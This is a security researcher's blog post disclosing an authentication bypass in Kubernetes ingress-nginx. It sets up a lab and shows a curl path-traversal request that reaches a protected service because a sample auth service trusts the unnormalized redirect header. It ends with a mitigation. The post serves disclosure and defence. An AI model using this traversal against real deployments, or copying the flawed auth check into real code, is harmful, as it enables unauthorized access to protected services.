In October 2021 I was researched [ingress-nginx](https://kubernetes.github.io/ingress-nginx/) for possibility to bypass external authentication using path traversal. It was origin story for other investigations regarding insecure usage of `$request_uri` which leaded to [Apache APISIX CVE-2021-43557](https://apisix.apache.org/blog/2021/11/23/cve-2021-43557-research-report/). I have started with report on HackerOne to Kubernetes project: https://hackerone.com/reports/1357948. It took long time for the team to investigate it, but in the end I got some bounty üòè sadly report was closed as informative. They asked me to create normal [issue](https://github.com/kubernetes/ingress-nginx/issues/8644) in github as this behavior is considered as **not security issue**. For me this is still an issue of **insecure design**.

Just look on values of `X-Original-Url` and `X-Auth-Request-Redirect` that are send to external auth service:
```
X-Request-Id: 7d979c82ca55141ed0d58655fbaac586
Host: auth-service.default.svc.cluster.local
X-Original-Url: http://app.test/public-service/..%2Fprotected-service/protected
X-Original-Method: GET
X-Sent-From: nginx-ingress-controller
X-Real-Ip: 192.168.99.1
X-Forwarded-For: 192.168.99.1
X-Auth-Request-Redirect: /public-service/..%2Fprotected-service/protected
Connection: close
User-Agent: curl/7.75.0
Accept: */*
```

Root cause of the problem, is how nginx is handling `$request_uri` variable. It's documented very "frugal":

{{< figure src="https://user-images.githubusercontent.com/17719543/170879498-1cca915f-9c5f-45f3-a6fc-fdfc97ff22a2.png" class="image-center" >}}

For me it's not enough. There should be brought documentation of risks associated with consuming not normalized paths. After pointing it out to nginx team, I got response that it's obvious that `$request_uri` is not normalized and developers should take care of their projects üòï. This would be perfect world, but we are not living in such. Just compare it with documentation in [envoy](https://www.envoyproxy.io):

* [rejecting-client-requests-with-escaped-slashes](https://www.getambassador.io/docs/edge-stack/latest/topics/running/ambassador/#rejecting-client-requests-with-escaped-slashes) - although it's not directly for Emissary. It's describing well envoy concerts for escaped slashes
* [GHSA-xcx5-93pw-jw2w](https://github.com/envoyproxy/envoy/security/advisories/GHSA-xcx5-93pw-jw2w) (CVE-2019‚Äì9901)‚Ää-‚Äädescription of risks associated with normalizing paths in envoy
* [envoy http connection manager options](https://www.envoyproxy.io/docs/envoy/latest/api-v3/extensions/filters/network/http_connection_manager/v3/http_connection_manager.proto)‚Ää-‚Äälook for two particular: `normalize_path` and `path_with_escaped_slashes_action`

## Setting the¬†stage

### install ingress-nginx into Kubernetes:

```bash
helm upgrade --install ingress-nginx ingress-nginx \
  --repo https://kubernetes.github.io/ingress-nginx \
  --namespace ingress-nginx --create-namespace
```

In case of problems follow [official guide](https://kubernetes.github.io/ingress-nginx/deploy/).

### deploy test application

```
kubectl apply -f https://raw.githubusercontent.com/xvnpw/k8s-ingress-auth-bypass/master/app.yaml
```

### [optional] forward ingress port

```
kubectl port-forward service/ingress-nginx-controller -n ingress-nginx 8080:80
```

### verify services

First public service. It should be available without authentication:

```
$ curl http://127.0.0.1:8080/public-service/public -H "Host: app.test"
{"data":"public data"}
```

and now protected:

```
$ curl http://127.0.0.1:8080/protected-service/protected  -H "Host: app.test"
<html>
<head><title>401 Authorization Required</title></head>
<body>
<center><h1>401 Authorization Required</h1></center>
<hr><center>nginx</center>
</body>
</html>

$ curl http://127.0.0.1:8080/protected-service/protected -H "X-Api-Key: secret-api-key" -H "Host: app.test"
{"data":"protected data"}
```

as you can see I need to provide "secret-api-key" to get resource.

## Exploitation

Let's send request with path traversal

```
$ curl --path-as-is http://127.0.0.1:8080/public-service/../protected-service/protected -H "Host: app.test"
{"data":"protected data"}
```

As you can see, I was able to bypass uri restrictions üòÑ

## Authentication service

Of course **not all** authentication services will be vulnerable. Only those that are making specific decisions based on requested paths. In my case service looks like this:

```
@app.route('/verify')
def verify():
    print(request.headers, file=sys.stderr)
    api_key = request.headers.get('X-Api-Key')
    request_redirect = request.headers.get('X-Auth-Request-Redirect')

    if request_redirect and request_redirect.startswith("/public-service/"):
        return Response(status = HTTPStatus.NO_CONTENT)

    if api_key == "secret-api-key":  
        return Response(status = HTTPStatus.NO_CONTENT)

    return Response(status = HTTPStatus.UNAUTHORIZED)
```

and ingress is defined as:

```
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: my-ingress
  annotations:
    kubernetes.io/ingress.class: "nginx"
    nginx.ingress.kubernetes.io/rewrite-target: /$1
    nginx.ingress.kubernetes.io/auth-url: http://auth-service.default.svc.cluster.local:8080/verify
spec:
  rules:
    - host: app.test
      http:
        paths:
          - path: /public-service/(.*)
            pathType: Prefix
            backend:
              service:
                name: public-service
                port:
                  number: 8080
          - path: /protected-service/(.*)
            pathType: Prefix
            backend:
              service:
                name: protected-service
                port:
                  number: 8080
```

### Mitigation

One thing is to not trust content of `X-Original-Uri` and `X-Auth-Request-Redirect` headers. But there is also nice variable that can be used: `$service_name`

```
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: my-ingress
  annotations:
    nginx.ingress.kubernetes.io/rewrite-target: /$1
    nginx.ingress.kubernetes.io/auth-url: http://auth-service.default.svc.cluster.local:8080/verify
    nginx.ingress.kubernetes.io/configuration-snippet: |
      more_set_input_headers "X-Forwarded-Scheme: $scheme";
      more_set_input_headers "X-Forwarded-Uri: $uri";
      more_set_input_headers "X-Forwarded-Prefix: $service_name";
      more_set_input_headers "X-Forwarded-Host: $http_host";
```

it allows to get name of service in kubernetes that is targeted by request and pass it to auth-url. This way it's not manipulated!

## Summary

I'm really happy that I have asked myself what is `X-Auth-Request-Redirect` header üôÇ This question took me for nice adventure, where I have checked source code of several ingress controllers. 

What is sad is how nginx is considering `$request_uri` and how hard is to convince both nginx and ingress-nginx team that this is real security problem.

Whole code of this example is here https://github.com/xvnpw/k8s-ingress-auth-bypass.
